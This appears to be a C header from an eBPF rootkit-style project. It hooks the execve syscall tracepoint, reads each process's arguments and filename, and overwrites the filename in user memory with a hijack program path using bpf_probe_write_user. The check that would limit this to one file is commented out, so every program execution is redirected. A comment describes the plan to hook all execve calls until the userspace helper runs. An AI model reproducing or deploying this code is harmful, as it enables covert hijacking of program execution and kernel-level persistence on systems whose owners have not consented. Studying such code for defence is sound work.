#ifndef __EXEC_H
#define __EXEC_H

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "../../../common/map_common.h"
#include "defs.h"
#include "../utils/strings.h"

#define NUMBER_ARGUMENTS_PARSED 12
#define ARGUMENT_LENGTH 64


/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format
 */
struct sys_execve_enter_ctx {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    char* filename;
    const char* const* argv;
    const char* const* envp;
};



static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx, __u64 pid_tgid){
    unsigned char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
    //unsigned char* envp[PROGRAM_LENGTH] = {0};
    unsigned char filename[ARGUMENT_LENGTH] = {0};
    if(ctx==NULL || ctx->argv == NULL){
        return -1;
    }
    if(bpf_probe_read_user(&argv, ARGUMENT_LENGTH, ctx->argv)<0){
        bpf_printk("Error reading 1\n");
    };
    /*if(bpf_probe_read_user(&envp, PROGRAM_LENGTH, ctx->envp)<0){
        bpf_printk("Error reading 2\n");
    };*/
    if(bpf_probe_read_user(&filename, ARGUMENT_LENGTH, ctx->filename)<0){
        bpf_printk("Error reading 3\n");
    };

    bpf_printk("ARGV0: %s\n", argv[0]);
    bpf_printk("ARGV1: %s\n", argv[1]);
    bpf_printk("ARGV2: %s\n", argv[2]);
    //bpf_printk("ENVP: %s\n", envp);
    bpf_printk("FILENAME: %s\n", filename);

    if(str_n_compare((char*)filename, ARGUMENT_LENGTH, (char*)PATH_EXECUTION_HIJACK_PROGRAM, sizeof(PATH_EXECUTION_HIJACK_PROGRAM), sizeof(PATH_EXECUTION_HIJACK_PROGRAM)-1)!=0){
        //return 0;
    }
    
    bpf_printk("Our file!\n");
    /*
    eBPF can only modify user memory, and thus we may find ourselves into trouble here
    As it can be here https://elixir.bootlin.com/linux/v5.11/source/fs/exec.c#L2054
    we receive an userspace buffer, but this is later tweaked via getname().
    Thus we may not have user-accessible memory, however from my experience it works _sometimes_.
    The idea is to hook all execve calls, but the first execution of our userspace helper will
    deactivate this hook.
    Also another solution could be to hook do_execve and access the filename struct, which still contians
    an userspace buffer inside.
    */

    char to_write[sizeof(PATH_EXECUTION_HIJACK_PROGRAM)] = {0};

    #pragma unroll
    for(int ii=0; ii<sizeof(PATH_EXECUTION_HIJACK_PROGRAM); ii++){
        (to_write[ii]) = PATH_EXECUTION_HIJACK_PROGRAM[ii];
    }
    
    bpf_printk("To write: %s\n", to_write);

    long ret = bpf_probe_write_user((void*)(ctx->filename), (void*)to_write, (__u32)sizeof(PATH_EXECUTION_HIJACK_PROGRAM));
    if(ret<0){
        bpf_printk("Error writing to user memory %i\n", ret);
        return -1;
    }

    unsigned char newfilename[ARGUMENT_LENGTH] = {0};
    if(bpf_probe_read_user(&newfilename, ARGUMENT_LENGTH, ctx->filename)<0){
        bpf_printk("Error reading 3\n");
    };
    bpf_printk("NEW FILENAME: %s\n", newfilename);

    return 0;
}


SEC("tp/syscalls/sys_enter_execve")
int tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        return -1;
    }

    return handle_tp_sys_enter_execve(ctx, pid_tgid);
}



#endif